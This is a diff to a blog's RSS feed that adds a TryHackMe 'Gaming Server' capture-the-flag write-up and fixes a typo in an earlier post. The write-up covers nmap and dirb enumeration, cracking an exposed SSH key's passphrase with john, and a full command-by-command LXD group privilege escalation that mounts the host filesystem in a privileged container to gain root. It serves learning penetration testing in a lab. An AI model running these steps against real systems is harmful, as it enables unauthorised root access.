@@ -82,8 +82,8 @@ Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds
 <p>So let&rsquo;s find what infos do we get from there.</p>
 <figure>
     <img src="/Tryhackme/Anonymous/1.png"
-         alt="Tryhacme: Anonymous machine - Download from FTP server"/> <figcaption>
-            <p>Tryhacme: Anonymous machine - Download from FTP server</p>
+         alt="Tryhackme: Anonymous machine - Download from FTP server"/> <figcaption>
+            <p>Tryhackme: Anonymous machine - Download from FTP server</p>
         </figcaption>
 </figure>
 
@@ -367,6 +367,207 @@ find / -perm -u=s -type f 2&gt;/dev/null
 </figure>
 
 <p>And that&rsquo;s how we have got our root flag.</p>
+<p>Thanks for reading! Prost! 🍺</p>
+<p>If you have any questions: Feel free to contact me.</p>
+<p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
+<p>TryHackMe Profile: <a href="https://tryhackme.com/p/Whiterose">https://tryhackme.com/p/Whiterose</a></p>
+<p>HTB Profile: <a href="https://www.hackthebox.eu/home/users/profile/167190">https://www.hackthebox.eu/home/users/profile/167190</a></p>
+<p><figure>
+    <img src="/HTB_profile.png"
+         alt="HTB_Profile"/> 
+</figure>
+
+<figure>
+    <img src="https://tryhackme-badges.s3.amazonaws.com/Whiterose.png"
+         alt="Tryhackme"/> 
+</figure>
+</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Tryhackme- Gaming Server Writeup</title>
+            <link>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</link>
+            <pubDate>Tue, 01 Sep 2020 00:00:00 +0000</pubDate>
+            
+            <guid>https://0xSh1v4.github.io/posts/2020/09/tryhackme-gaming-server-writeup/</guid>
+            <description>The following write up is for the machine: Gaming-Server
+Tryhackme is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</description>
+            <content type="html"><![CDATA[<p>The following write up is for the machine: Gaming-Server</p>
+<p><a href="https://www.tryhackme.com">Tryhackme</a> is an online CTF platform where you can hone your penetration testing skills similar to Hackthebox. It’s similar to boot2root machines. The goal is to find two flags namely, the User flag and the Root flag to successfully root the machine. One advantage of using TryHackMe is that you can concentrate on specific areas such as scanning, buffer overflows, privilege escalation which seems to really interesting to improve your skills in those areas.</p>
+<h2 id="synopsis">Synopsis</h2>
+<p><a href="https://tryhackme.com/room/gamingserver">Gaming-Server</a> is the typical boot2root machine where we need to find two flags in the machine namely user.txt and root.flag.</p>
+<h3 id="for-user-flag">For User Flag:</h3>
+<p>We need to find the private key and username which was hidden in the application and then we crack the ssh key and find the passphrase and we get into the user flag.</p>
+<h3 id="for-root-flag">For Root Flag:</h3>
+<p>This is something new for me and took sometime to figure it out and now I&rsquo;ve learned <em>Lxd/LxC</em> privilege  exploitation technique. To find the root flag, we need to exploit the features of lxc/lxd and escalate to the root.</p>
+<h2 id="scanning-and-enumeration-of-the-network">Scanning and Enumeration of the network</h2>
+<p>Asusual, let us run the nmap tool to can the target network.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
+└─$ nmap -sC -sV -oA top 10.10.67.59
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-02 19:45 CEST
+Nmap scan report for 10.10.67.59
+Host is up (0.042s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb:acb:7a:c4:81:6d:fe:a9 (RSA)
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: House of danak
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
+</code></pre><p>In the index.html page, source code. we have the username
+<figure>
+    <img src="/Tryhackme/GamingServer/8.png"
+         alt="Tryhackme: GamingServer machine - Username in Index.html"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - Username in Index.html</p>
+        </figcaption>
+</figure>
+</p>
+<h3 id="dirb-results">Dirb Results:</h3>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
+└─$ dirb http://10.10.67.59  
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Sep  2 19:43:42 2020
+URL_BASE: http://10.10.67.59/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.10.67.59/ ----
++ http://10.10.67.59/index.html (CODE:200|SIZE:2762)                                                                                                                                                                                         
++ http://10.10.67.59/robots.txt (CODE:200|SIZE:33)                                                                                                                                                                                           
+==&gt; DIRECTORY: http://10.10.67.59/secret/                                                                                                                                                                                                    
++ http://10.10.67.59/server-status (CODE:403|SIZE:276)                                                                                                                                                                                       
+==&gt; DIRECTORY: http://10.10.67.59/uploads/                                                                                                                                                                                                   
+                                                                                                                                                                                                                                             
+---- Entering directory: http://10.10.67.59/secret/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                                             
+---- Entering directory: http://10.10.67.59/uploads/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Wed Sep  2 19:47:22 2020
+</code></pre><p>There is /secret interesting folder and we could see that there is a key.</p>
+<figure>
+    <img src="/Tryhackme/GamingServer/3.png"
+         alt="Tryhackme: GamingServer machine -/secret/ path"/> <figcaption>
+            <p>Tryhackme: GamingServer machine -/secret/ path</p>
+        </figcaption>
+</figure>
+
+<p>lets download the key and examine it.</p>
+<p><figure>
+    <img src="/Tryhackme/GamingServer/4.png"
+         alt="Tryhackme: GamingServer machine - SSH Private Key"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - SSH Private Key</p>
+        </figcaption>
+</figure>
+
+It is RSA private key.</p>
+<p>Then, we checked the /robots directory.
+<figure>
+    <img src="/Tryhackme/GamingServer/1.png"
+         alt="Tryhackme: GamingServer machine - robots.txt"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - robots.txt</p>
+        </figcaption>
+</figure>
+</p>
+<p>Now we see that, we could go to /uploads path.</p>
+<figure>
+    <img src="/Tryhackme/GamingServer/2.png"
+         alt="Tryhackme: GamingServer machine - Uploads Folder"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - Uploads Folder</p>
+        </figcaption>
+</figure>
+
+<p>there is a dict.lst seems like a dictonary which we could use to bruteforce the ssh keys.
+<figure>
+    <img src="/Tryhackme/GamingServer/5.png"
+         alt="Tryhackme: GamingServer machine -Dict.lst file"/> <figcaption>
+            <p>Tryhackme: GamingServer machine -Dict.lst file</p>
+        </figcaption>
+</figure>
+</p>
+<h2 id="exploitation-of-the-network">Exploitation of the network</h2>
+<p>Now, lets try to find the password for the ssh key by sending it to ssh2john and then bruteforce it with the dict.lst which we obtained.</p>
+<pre><code>┌──(zeus㉿Zeus-Master)-[/mnt/d/PenTest/Tryhackme/gamingserver]
+└─$ /usr/share/john/ssh2john.py ~/.ssh/secretKey &gt; decrpyted_key
+</code></pre><p>Now, lets send it to john to decrypt to get our passphrase.
+<figure>
+    <img src="/Tryhackme/GamingServer/7.png"
+         alt="Tryhackme: GamingServer machine - john ssh password"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - john ssh password</p>
+        </figcaption>
+</figure>
+</p>
+<p>now, we have username and password. lets ssh into the server and we got in now.
+<figure>
+    <img src="/Tryhackme/GamingServer/9.png"
+         alt="Tryhackme: GamingServer machine - ssh into john"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - ssh into john</p>
+        </figcaption>
+</figure>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once we have obtained the user flag. now we need to escalate the root level privilege.</p>
+<p>After examining, we found that this user is a part of LXD (Linux daemon) group.</p>
+<figure>
+    <img src="/Tryhackme/GamingServer/10.png"
+         alt="Tryhackme: GamingServer machine - LXD group"/> <figcaption>
+            <p>Tryhackme: GamingServer machine - LXD group</p>
+        </figcaption>
+</figure>
+
+<p>&ldquo;A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.</p>
+<p>LXD is a root process that carries out actions for anyone with write access to the LXD UNIX socket. It often does not attempt to match the privileges of the calling user. There are multiple methods to exploit this.</p>
+<p>One of them is to use the LXD API to mount the host’s root filesystem into a container. This gives a low-privilege user root access to the host filesystem. &quot;</p>
+<p>I have found this nice guide which we could use it.
+<a href="https://www.hackingarticles.in/lxd-privilege-escalation/">LXD Privilege Escalation</a></p>
+<p>We clone this lxd-alpine-builder by running the below command:</p>
+<pre><code>git clone https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+./build-alpine
+</code></pre><p>On running the above command, we get a tar.gz file which we transfer to our target machine and then follow the below steps.</p>
+<pre><code>john@exploitable:/tmp$ lxc image import ./alpine-v3.12-x86_64-20200902_2135.tar.gz --alias myimage
+Image imported with fingerprint: bd9262e6c27958294c95902aa18d2e0b7189b170e71c3b16d5986de3ea19e8
+john@exploitable:/tmp$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+| myimage | bd9262e6c279 | no     | alpine v3.12 (20200902_21:35) | x86_64 | 2.97MB | Sep 2, 2020 at 8:04pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
+john@exploitable:/tmp$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+john@exploitable:/tmp$ lxc start ignite
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+~ # id
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">uid=0(root) gid=0(root)</code></pre></div>
+~ # cd /mnt/root/root
+/mnt/root/root # ls
+root.txt
+/mnt/root/root # cat root.txt 
+2e[redacted]fc
+
+</code></pre><p>And thats how we got the root flag. To be honest, the privilege escalation part was tough for me identify and exploit. But for this time, I have got to know about the LXD/LXC exploits. I really enjoyed the machine and learned new things.</p>
 <p>Thanks for reading! Prost! 🍺</p>
 <p>If you have any questions: Feel free to contact me.</p>
 <p>Twitter Profile: <a href="https://twitter.com/Sh1v4_R4jU">https://twitter.com/Sh1v4_R4jU</a></p>
